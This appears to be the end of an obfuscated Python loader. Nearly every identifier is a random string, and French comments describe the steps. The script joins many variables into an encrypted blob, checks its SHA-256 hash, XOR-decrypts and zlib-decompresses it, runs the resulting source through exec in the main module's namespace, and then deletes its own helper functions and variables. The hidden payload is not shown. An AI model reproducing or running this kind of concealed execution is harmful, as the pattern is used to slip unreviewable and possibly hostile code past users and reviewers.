_czU79u7MPHzHro + _cvPZ9Iyiv_vXa8 + _cbrJGD3K14ny93 + _ccWj8guT6cy1hs + _ceULSHk7F5o4uZ + _cuwehASynSFShj + _cx8_eq3qJ7AQee + _cswmS_HmDM2vWT + _cifQufZVfOhdYK + _cmA9P3a0x7wXVI + _cezJGXRdUOVqBJ + _ceiC0_778Q8Xyw + _cvhl7LxdDJtGK2 + _cfDjq5jvDFmMgN + _cb67Jgu0dZ8M1a + _cnC1Dc4bLYFgzf + _cxcnix4igTShaK + _ci7nNSewYtOvim + _cv1eQUtbQUT8n8 + _czOJjp3qP1Mc6A + _ciEOAapTXKAz9F + _cowRayrIjBdTIx + _cz1j0nA4cF0Ldd + _cpXPYqCGwkku5l + _ct8KZsTyKXvYIo + _c_J3ggMj9uc0vV + _csEhiK4YzG5Nzc + _cmONjqW3pN3xKL + _clcfozy7dAnfSA + _csnabkpEb8DP_0 + _cjD4h8ltJtn_nf + _csF_AmbRHCGuuJ + _cuFCbqHR72t1Pk + _cl5wvzzH971RMw + _cnJ1MpGbPzdwhG + _ci1mCmr8lovijk + _ci6ykhh_HfV6l0 + _crpqq6gyLWuCUy + _cpiHu64iYr19LX + _ceJSm0gxyJE2Hf + _ctcfNXA73fMjf8 + _ctI53GkuOV0386 + _cjqfLXRWkV09i2 + _cd5TWckk5unXgr + _ce9lR1SLYdtqSn + _c_MsykY_YB_leR + _clKEb1j33jxQcQ + _cdQAC8DaDy4O7h + _coZqKGnv8qgjhf + _cfiv01hL7xsKXb + _cdeYl3nYn4xmoC + _ciQb0nTg6z5cTc + _ciDZnjzm6NHcs0 + _ccDfpV37CDjyCP + _cc3LhlRt44x7Mt + _ciFbZL_FihqzOb + _cxf9tBDLip6vxe + _cw83MPoblaoRBR + _cok6cflQZFIkbY + _cxpDtAquvPDiNM + _cimaJ4QOqcEJEo + _cvs0KQ1uRL2EHF + _clsr9gWXmbQY4z + _cc80x4l3EF0SDR + _ce_EUZn04TpTAe + _cucaAs3icLyM2m + _ceJdOZ_10rgvko + _cq8t23A9jJeMdQ + _ccwUsnR1HLcCyF + _caIZ_92YPLvr1Y + _coKj52kIBN3RLc + _clUC6f3KdPld0b + _cejMoFdz0WpbDb + _cuq5FoHWm8t8uS + _cg3rxB3C57XFTi + _cawK7rAsPgeTf3 + _ceh8KIQ8JpbFGX + _cwlwWkBQifsEUx + _ckfqkX3CWajTKA + _clK7xZE_24fT8Q + _co7WePaiQo7fY1 + _cjcEuYUZW5OCnZ + _chMUvnqfekp5rA + _cgGIcVjr4QCCsh + _cqIkvfhLAI2UKW + _coNM0MC_1pEPdr + _c_5KdQGaQNYhqR + _crFI4G9r8PHyN0 + _ckoxP5udRBiaAB + _cp8ppuXf9pBAaq + _cmh44Xm7eXUfbT + _cqXY6ezMY1IMZY + _cfheEyj3JGVC0o + _cbxxLZ7wBOwlES + _coUmRw9c1q_C3B + _cwRmqBOqbFZqTO + _chk2gImDYdAiX7 + _cqIMnuqFPt7lVV + _csbzMMazB2Z06_ + _cybxqcrfJg82yz + _czQlWUqaYj4Q8P + _czQDDaHcTO9X6P + _cruIeQE4ohTuKe + _cjLiCBVzlRtaqM + _chqrs1xX0SPF3x + _cyadmXsZq7j6yo + _cob1DhRdUpSJKV + _cjME0gBopWLLgu + _cuSptNUMXrY6EL + _cnHWJCtXc7Sols + _cqkKnwgljeAqBJ + _cvLgdZUVzRGjuR + _ccvcPiNMUoRI5R + _ccQDANIZEi1GlP + _cpNNN2FuwlIkWU + _cvws35kg1naeyf + _co2FS9CCZYVk1e + _cjwJPZGDTUHlXs + _cdUCba1HbawZSt + _ct6PaOBzweKyXH + _cqD386oV6UG0c3 + _cqPIe_AJA3Za7R + _cy6OVTumY30I3s + _ciRgfKew2ZOhmi + _cxea6gkEX1amLD + _cytWwzMrcgnRVV + _cgdiUtLdLS3pMO + _cpsZJOOsNvgfBR + _cvZbyFiYEfDmbz + _cnS1n7KZarvjAM + _crH4hEPhYxjPu7 + _co6cw6NIJZ8k7e + _cpfhkQUpzUk2lN)
if __import__('hashlib').sha256(_px8GtjbkB8qtc8).hexdigest() != '3189d0a5292c4cb395cb7587142ab31138016277fbd0c4150c3c4a1739ba95dc':
    __import__('sys').exit(1)
_xqKesLf0Ii4fB5 = bytes([41, 59, 219, 198, 20, 86, 250, 46, 11, 71, 134, 202, 127])
_fkh09BA6SkG9i9c = bytes([70, 39, 92, 52, 8, 203, 122, 63, 219, 130, 141, 35, 61])

def _fxgif421DsSvOeN(_bqvee35ccn06Xp, _kv_Oipiveo2ZgA):
    return bytes(_bqvee35ccn06Xp[_io2gr4WPwjszHY] ^ _kv_Oipiveo2ZgA[_io2gr4WPwjszHY % len(_kv_Oipiveo2ZgA)] for _io2gr4WPwjszHY in range(len(_bqvee35ccn06Xp)))

def _fdfNnmrkhHbeSmh(_treCZuMiYmT8sd):
    import zlib
    return zlib.decompress(_treCZuMiYmT8sd) # Un seul niveau de zlib ici pour simplifier

def _feaNLVO82_mr74i():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xlcW49JvcgpsDq = _fxgif421DsSvOeN(_px8GtjbkB8qtc8, _xqKesLf0Ii4fB5)
    # 2. Décompression Zlib
    _diJhBptQEirQu8 = _fdfNnmrkhHbeSmh(_xlcW49JvcgpsDq)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _diJhBptQEirQu8.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nszxflxD56J3b2 = _main.__dict__
    _nszxflxD56J3b2.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nszxflxD56J3b2)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feaNLVO82_mr74i()
try:
    del _fxgif421DsSvOeN, _fdfNnmrkhHbeSmh, _feaNLVO82_mr74i
    del _px8GtjbkB8qtc8, _xqKesLf0Ii4fB5, _fkh09BA6SkG9i9c
except:
    pass
